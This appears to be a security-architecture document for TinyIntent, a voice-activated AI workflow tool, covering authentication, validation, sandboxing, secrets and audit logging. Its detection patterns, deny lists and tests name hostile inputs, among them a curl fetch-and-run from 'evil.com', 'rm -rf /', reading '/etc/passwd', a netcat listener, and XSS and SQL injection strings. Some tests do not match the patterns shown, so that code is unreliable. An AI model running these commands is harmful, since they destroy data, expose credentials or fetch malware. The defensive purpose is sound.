# 🛡️ TinyIntent Security Model

This document outlines TinyIntent's comprehensive security architecture, designed to protect against various attack vectors while maintaining usability for voice-activated AI workflows.

## 🎯 Security Philosophy

### Core Security Principles

1. **🔒 Defense in Depth**: Multiple independent security layers
2. **🔐 Zero Trust**: Verify every request and component
3. **🏰 Principle of Least Privilege**: Minimal permissions for all operations
4. **📋 Comprehensive Audit**: Log all security-relevant events
5. **🚨 Fail Secure**: Secure failure modes for all error conditions
6. **🌊 Graceful Degradation**: Maintain security even during failures

### Threat Model

**Primary Threats**:
- Unauthorized API access from network attackers
- Code injection through voice commands or API inputs
- Helper escape from sandbox constraints
- Secret exposure to untrusted components
- Timing attacks on authentication mechanisms
- Cross-Site Request Forgery (CSRF) attacks

**Out of Scope**:
- Physical device compromise
- iPhone/iOS security vulnerabilities
- macOS kernel vulnerabilities
- Network infrastructure attacks

## 🏗️ Security Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    TinyIntent Security Layers                  │
├─────────────────────────────────────────────────────────────────┤
│ Layer 1: Network Security                                      │
│ • Token-based authentication for iPhone Shortcuts             │
│ • API secret authentication for advanced operations           │
│ • Constant-time comparison to prevent timing attacks          │
│ • Rate limiting with per-session and global limits           │
├─────────────────────────────────────────────────────────────────┤
│ Layer 2: Input Security                                       │
│ • Comprehensive input validation with schema enforcement      │
│ • Script injection detection using pattern matching          │
│ • Length limits to prevent buffer overflow attacks           │
│ • Type validation for all parameters                         │
├─────────────────────────────────────────────────────────────────┤
│ Layer 3: Application Security                                 │
│ • CSRF protection for state-changing operations              │
│ • Secure session management with token expiration            │
│ • Emergency kill switches for immediate shutdown             │
│ • Capability-based access control for helpers                │
├─────────────────────────────────────────────────────────────────┤
│ Layer 4: Execution Security                                   │
│ • Process sandboxing with isolated working directories       │
│ • Resource limits (CPU, memory, file descriptors)           │
│ • Network isolation (disabled by default for helpers)       │
│ • Command validation to prevent dangerous operations         │
├─────────────────────────────────────────────────────────────────┤
│ Layer 5: Data Security                                        │
│ • Scoped secret management with encryption                   │
│ • Audit logging with integrity chains                        │
│ • Provenance tracking with cryptographic signing            │
│ • Secure credential generation and storage                   │
└─────────────────────────────────────────────────────────────────┘
```

## 🔐 Authentication & Authorization

### Authentication Mechanisms

#### 1. iPhone Shortcut Authentication
```
Header: X-Shortcut-Token
Purpose: Authenticate iPhone Shortcuts requests
Security: 
- Cryptographically secure token generation
- Constant-time comparison to prevent timing attacks
- Token rotation support
```

#### 2. API Secret Authentication
```
Header: X-TinyIntent-Secret
Purpose: Authenticate advanced API operations
Security:
- 256-bit entropy minimum
- Environment variable storage
- Automatic generation with secure defaults
```

#### 3. Development Mode Bypass
```
Condition: localhost requests in development mode
Purpose: Streamlined development experience
Security:
- Only enabled for 127.0.0.1 and ::1
- Disabled in production environments
- No forwarded headers allowed
```

### Authentication Implementation

```python
def verify_auth(request: Request, credentials: HTTPAuthorizationCredentials) -> bool:
    """Verify authentication using multiple methods with timing attack protection."""
    
    # Development bypass for localhost
    if settings.security.allow_dev_local and settings.is_development():
        if is_localhost_request(request):
            return True
    
    # Get secret from headers
    secret_header = request.headers.get("X-TinyIntent-Secret")
    if not secret_header:
        raise HTTPException(status_code=401, detail="Authentication required")
    
    # Constant-time comparison prevents timing attacks
    expected_secret = get_tinyintent_secret()
    if not constant_time_compare(secret_header, expected_secret):
        # Log failed authentication attempt
        audit_logger.log_entry({
            "action": "authentication_failed",
            "client_ip": request.client.host,
            "success": False
        })
        raise HTTPException(status_code=401, detail="Invalid authentication")
    
    return True

def constant_time_compare(a: str, b: str) -> bool:
    """Constant time string comparison to prevent timing attacks."""
    return hmac.compare_digest(a.encode(), b.encode())
```

## 🔒 Input Validation & Sanitization

### Validation Framework

```python
def validate_text_input(text: str, max_length: int = 1000, 
                       field_name: str = "text") -> str:
    """Comprehensive text input validation."""
    
    # Basic validation
    if not text or not isinstance(text, str):
        raise ValidationError(f"{field_name} must be a non-empty string")
    
    # Length validation
    if len(text) > max_length:
        raise ValidationError(f"{field_name} exceeds maximum length of {max_length}")
    
    # Script injection detection
    if _contains_script_injection(text):
        raise ValidationError(f"{field_name} contains potentially dangerous content")
    
    # Control character filtering
    if _contains_control_characters(text):
        raise ValidationError(f"{field_name} contains invalid control characters")
    
    return text.strip()

def _contains_script_injection(text: str) -> bool:
    """Detect potential script injection patterns."""
    dangerous_patterns = [
        r'<script[^>]*>.*?</script>',
        r'javascript:',
        r'vbscript:',
        r'on\w+\s*=',
        r'eval\s*\(',
        r'document\.',
        r'window\.',
        r'\$\(',
        r'import\s+',
        r'__import__',
        r'exec\s*\(',
        r'system\s*\(',
        r'subprocess\.',
        r'os\.',
        r'file\s*\(',
        r'open\s*\(',
    ]
    
    text_lower = text.lower()
    return any(re.search(pattern, text_lower, re.IGNORECASE | re.DOTALL) 
              for pattern in dangerous_patterns)
```

### Schema Validation

```python
def validate_json_input(data: Dict[str, Any], schema: Dict[str, Any], 
                       field_name: str = "data") -> Dict[str, Any]:
    """Validate JSON input against schema."""
    try:
        # Use jsonschema for validation
        jsonschema.validate(data, schema)
        
        # Additional recursive validation for nested objects
        for key, value in data.items():
            if isinstance(value, str):
                validate_text_input(value, field_name=f"{field_name}.{key}")
        
        return data
    except jsonschema.ValidationError as e:
        raise ValidationError(f"Invalid {field_name}: {e.message}")
```

## 🚦 Rate Limiting & Abuse Protection

### Rate Limiting Implementation

```python
class RateLimiter:
    """Thread-safe rate limiter with rolling windows."""
    
    def __init__(self, session_limit: int = 60, global_limit: int = 500, 
                 window_seconds: int = 60):
        self.session_limit = session_limit
        self.global_limit = global_limit
        self.window_seconds = window_seconds
        self.session_requests: Dict[str, List[tuple]] = {}
        self.global_requests: List[tuple] = []
        self.lock = threading.Lock()
    
    def check_rate_limit(self, session_id: str) -> tuple[bool, Optional[int]]:
        """Check if request should be rate limited."""
        current_time = time.time()
        cutoff_time = current_time - self.window_seconds
        
        with self.lock:
            # Count session requests in current window
            session_count = self._count_requests(
                self.session_requests.get(session_id, []), cutoff_time
            )
            
            # Count global requests in current window
            global_count = self._count_requests(self.global_requests, cutoff_time)
            
            # Check limits
            if session_count >= self.session_limit:
                return False, self.window_seconds
            
            if global_count >= self.global_limit:
                return False, self.window_seconds
            
            # Add this request to counters
            self._add_request(session_id, current_time)
            return True, None
```

### Abuse Detection

```python
def detect_abuse_patterns(session_id: str, request_history: List[Dict]) -> List[str]:
    """Detect potential abuse patterns."""
    warnings = []
    
    # Check for rapid repeated requests
    if len(request_history) >= 5:
        recent_requests = request_history[-5:]
        time_span = recent_requests[-1]["timestamp"] - recent_requests[0]["timestamp"]
        if time_span < 10:  # 5 requests in 10 seconds
            warnings.append("RAPID_REQUESTS")
    
    # Check for repeated identical inputs
    recent_inputs = [req.get("text", "") for req in request_history[-10:]]
    if len(set(recent_inputs)) < len(recent_inputs) // 2:
        warnings.append("REPEATED_INPUTS")
    
    # Check for suspicious patterns in text
    for req in request_history[-3:]:
        text = req.get("text", "")
        if _contains_script_injection(text):
            warnings.append("INJECTION_ATTEMPT")
    
    return warnings
```

## 🏰 Sandboxing & Isolation

### Helper Sandboxing Architecture

```python
class HelperSandbox:
    """Sandboxed execution environment for helpers."""
    
    def __init__(self, helper_id: str, audit_log_path: Path, 
                 capabilities: List[str] = None):
        self.helper_id = helper_id
        self.audit_log_path = audit_log_path
        self.capabilities = capabilities or []
        self.work_dir = self._create_isolated_workdir()
    
    def execute(self, command: List[str], input_data: str, 
                timeout: int = 30) -> Dict[str, Any]:
        """Execute command in sandboxed environment."""
        
        # Validate command against security policy
        self._validate_command(command)
        
        # Set up sandbox environment
        env = self._create_sandbox_environment()
        
        # Apply resource limits
        def preexec_fn():
            # Set process group for cleanup
            os.setpgrp()
            
            # Set resource limits
            resource.setrlimit(resource.RLIMIT_CPU, (timeout, timeout))
            resource.setrlimit(resource.RLIMIT_AS, (256 * 1024 * 1024, 256 * 1024 * 1024))
            resource.setrlimit(resource.RLIMIT_NOFILE, (50, 50))
        
        try:
            # Execute with timeout and resource limits
            process = subprocess.Popen(
                command,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.work_dir,
                env=env,
                preexec_fn=preexec_fn,
                text=True
            )
            
            stdout, stderr = process.communicate(input=input_data, timeout=timeout)
            
            return {
                "returncode": process.returncode,
                "stdout": stdout,
                "stderr": stderr,
                "success": process.returncode == 0
            }
            
        except subprocess.TimeoutExpired:
            # Kill process group to ensure cleanup
            os.killpg(process.pid, signal.SIGKILL)
            raise SandboxTimeoutError(f"Helper {self.helper_id} timed out after {timeout}s")
        
        finally:
            # Clean up working directory
            self._cleanup_workdir()

    def _validate_command(self, command: List[str]) -> None:
        """Validate command against security policy."""
        dangerous_commands = [
            r'rm\s+-rf\s+/',
            r'sudo\s+',
            r'su\s+',
            r'chmod\s+777',
            r'>/dev/',
            r'curl\s+.*\|.*sh',
            r'wget\s+.*\|.*sh'
        ]
        
        full_command = ' '.join(command)
        for pattern in dangerous_commands:
            if re.search(pattern, full_command, re.IGNORECASE):
                raise SandboxSecurityViolation(
                    f"Dangerous command pattern detected: {pattern}"
                )
```

### Resource Limits

| Resource | Limit | Enforcement |
|----------|--------|-------------|
| CPU Time | 30 seconds | `RLIMIT_CPU` |
| Memory | 256 MB | `RLIMIT_AS` |
| File Descriptors | 50 | `RLIMIT_NOFILE` |
| Network | Disabled | Environment filtering |
| Filesystem | Isolated | Temporary working directory |

## 🔑 Secret Management

### Scoped Secret Architecture

```python
class SecretScope(Enum):
    """Secret access scope levels."""
    PUBLIC = "public"          # Available to all helpers
    TRUSTED = "trusted"        # Only trusted helpers
    SYSTEM = "system"          # Only system/internal use
    HELPER_SPECIFIC = "helper_specific"  # Specific helper only

class SecretManager:
    """Manages secrets with scoped access control."""
    
    def get_secret(self, name: str, helper_id: str, 
                   helper_trust_level: str = "draft") -> Optional[str]:
        """Retrieve a secret for a helper if access is allowed."""
        
        if name not in self.metadata:
            return None
        
        secret_meta = self.metadata[name]
        scope = SecretScope(secret_meta["scope"])
        
        # Check access permissions
        if not self._check_access_permission(scope, helper_id, helper_trust_level, secret_meta):
            raise SecretViolation(
                f"Helper {helper_id} does not have access to secret {name}",
                name, helper_id, scope.value
            )
        
        # Load and decrypt secret
        encrypted_value = self._load_encrypted_secret(name)
        decrypted_value = self._decrypt_secret(encrypted_value)
        
        # Log secret access
        self._log_secret_access(name, helper_id, helper_trust_level, scope.value)
        
        return decrypted_value
    
    def _check_access_permission(self, scope: SecretScope, helper_id: str, 
                               helper_trust_level: str, secret_meta: Dict) -> bool:
        """Check if helper has permission to access secret."""
        if scope == SecretScope.PUBLIC:
            return True
        elif scope == SecretScope.TRUSTED:
            return helper_trust_level == "trusted"
        elif scope == SecretScope.HELPER_SPECIFIC:
            return secret_meta.get("helper_id") == helper_id
        elif scope == SecretScope.SYSTEM:
            return False  # System secrets not accessible to helpers
        
        return False
```

### Secret Encryption

```python
def _encrypt_secret(self, value: str) -> bytes:
    """Encrypt a secret value using AES-256-GCM."""
    # Generate random nonce
    nonce = secrets.token_bytes(12)
    
    # Encrypt with authenticated encryption
    cipher = AES.new(self._encryption_key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(value.encode('utf-8'))
    
    # Return nonce + tag + ciphertext
    return nonce + tag + ciphertext

def _decrypt_secret(self, encrypted_value: bytes) -> str:
    """Decrypt a secret value."""
    # Extract components
    nonce = encrypted_value[:12]
    tag = encrypted_value[12:28]
    ciphertext = encrypted_value[28:]
    
    # Decrypt and verify
    cipher = AES.new(self._encryption_key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    
    return plaintext.decode('utf-8')
```

## 📋 Audit Logging & Monitoring

### Comprehensive Audit Trail

```python
class AuditLogger:
    """Comprehensive audit logging with integrity verification."""
    
    def log_entry(self, entry: Dict[str, Any]) -> None:
        """Log an audit entry with integrity chain."""
        
        # Add timestamp and unique ID
        entry["ts"] = datetime.utcnow().isoformat() + "Z"
        entry["id"] = str(uuid.uuid4())
        
        # Add integrity chain
        if self.last_hash:
            entry["prev_hash"] = self.last_hash
        
        # Compute hash for this entry
        entry_json = json.dumps(entry, sort_keys=True)
        entry_hash = hashlib.sha256(entry_json.encode()).hexdigest()
        entry["hash"] = entry_hash
        
        # Write to log file
        with open(self.log_file, 'a') as f:
            f.write(entry_json + '\n')
        
        self.last_hash = entry_hash
        
        # Rotate log if needed
        if self._should_rotate():
            self._rotate_log()

def log_security_event(event_type: str, details: Dict[str, Any], 
                      success: bool = True, severity: str = "info"):
    """Log security-relevant events."""
    audit_logger.log_entry({
        "action": "security_event",
        "event_type": event_type,
        "details": details,
        "success": success,
        "severity": severity,
        "timestamp": time.time()
    })
```

### Security Monitoring

```python
def monitor_security_events():
    """Monitor audit log for security incidents."""
    
    # Check for authentication failures
    auth_failures = count_recent_events("authentication_failed", window_minutes=5)
    if auth_failures > 10:
        trigger_security_alert("HIGH_AUTH_FAILURE_RATE", {
            "failures": auth_failures,
            "window": "5 minutes"
        })
    
    # Check for rate limit violations
    rate_limit_violations = count_recent_events("rate_limit_exceeded", window_minutes=10)
    if rate_limit_violations > 20:
        trigger_security_alert("HIGH_RATE_LIMIT_VIOLATIONS", {
            "violations": rate_limit_violations,
            "window": "10 minutes"
        })
    
    # Check for sandbox violations
    sandbox_violations = count_recent_events("sandbox_violation", window_minutes=30)
    if sandbox_violations > 5:
        trigger_security_alert("SANDBOX_VIOLATIONS", {
            "violations": sandbox_violations,
            "window": "30 minutes"
        })
```

## 🚨 Emergency Response

### Emergency Kill Switch

```python
class EmergencyKillSwitch:
    """Emergency shutdown mechanism for security incidents."""
    
    def trigger_emergency_kill(self, reason: str, triggered_by: str) -> bool:
        """Trigger emergency kill switch."""
        
        # Create emergency flag file atomically
        emergency_data = {
            "triggered_at": datetime.utcnow().isoformat(),
            "reason": reason,
            "triggered_by": triggered_by
        }
        
        # Atomic write to prevent race conditions
        temp_file = self.flag_file_path.with_suffix('.tmp')
        with open(temp_file, 'w') as f:
            json.dump(emergency_data, f, indent=2)
        
        os.replace(str(temp_file), str(self.flag_file_path))
        
        # Disable execution in memory
        self._execution_enabled = False
        
        # Log emergency event
        audit_logger.log_entry({
            "action": "emergency_kill",
            "reason": reason,
            "triggered_by": triggered_by,
            "severity": "CRITICAL"
        })
        
        return True
```

### Incident Response Procedures

1. **Detection**: Automated monitoring triggers alerts
2. **Assessment**: Determine severity and scope
3. **Containment**: Emergency kill switch if needed
4. **Investigation**: Analyze audit logs for root cause
5. **Recovery**: Restore service with fixes applied
6. **Documentation**: Update security measures based on lessons learned

## 🔍 Security Testing

### Automated Security Tests

```python
def test_authentication_timing_attack():
    """Verify constant-time comparison prevents timing attacks."""
    
    # Test with correct and incorrect secrets
    correct_secret = "correct-secret-123"
    incorrect_secret = "wrong-secret-456"
    
    # Measure timing for multiple comparisons
    correct_times = []
    incorrect_times = []
    
    for _ in range(1000):
        start = time.perf_counter()
        constant_time_compare(correct_secret, correct_secret)
        correct_times.append(time.perf_counter() - start)
        
        start = time.perf_counter()
        constant_time_compare(correct_secret, incorrect_secret)
        incorrect_times.append(time.perf_counter() - start)
    
    # Statistical analysis should show no timing difference
    correct_avg = sum(correct_times) / len(correct_times)
    incorrect_avg = sum(incorrect_times) / len(incorrect_times)
    
    # Timing difference should be negligible
    assert abs(correct_avg - incorrect_avg) < 0.0001

def test_input_validation_prevents_injection():
    """Verify input validation prevents various injection attacks."""
    
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "{{ config.items() }}",
        "__import__('os').system('rm -rf /')",
        "eval('malicious code')",
        "javascript:alert(1)"
    ]
    
    for malicious_input in malicious_inputs:
        with pytest.raises(ValidationError):
            validate_text_input(malicious_input)

def test_sandbox_prevents_escape():
    """Verify sandbox prevents helper escape attempts."""
    
    dangerous_commands = [
        ["rm", "-rf", "/"],
        ["curl", "http://evil.com/malware.sh", "|", "sh"],
        ["sudo", "cat", "/etc/passwd"],
        ["chmod", "777", "/tmp"],
        ["nc", "-l", "4444"]
    ]
    
    sandbox = HelperSandbox("test_helper", Path("/tmp/audit.log"))
    
    for command in dangerous_commands:
        with pytest.raises(SandboxSecurityViolation):
            sandbox.execute(command, "", timeout=5)
```

### Manual Security Review

1. **Code Review**: All security-relevant changes require review
2. **Penetration Testing**: Regular security testing of API endpoints
3. **Configuration Review**: Verify secure defaults and configurations
4. **Dependency Scanning**: Monitor for vulnerable dependencies

## 📈 Security Metrics

### Key Performance Indicators

| Metric | Target | Monitoring |
|--------|---------|------------|
| Authentication Success Rate | >99% | Real-time |
| Failed Auth Attempts | <10/hour | Alert threshold |
| Input Validation Failures | <1% | Daily review |
| Sandbox Violations | 0 | Immediate alert |
| Secret Access Violations | 0 | Immediate alert |
| Emergency Kill Activations | 0 | Manual review |

### Regular Security Reviews

- **Weekly**: Review audit logs for anomalies
- **Monthly**: Update threat model and security tests
- **Quarterly**: Full security assessment and penetration testing
- **Annually**: Complete security architecture review

---

This security model provides defense-in-depth protection while maintaining the usability that makes TinyIntent effective for voice-activated AI workflows. The layered approach ensures that even if one security control fails, multiple other controls continue to protect the system.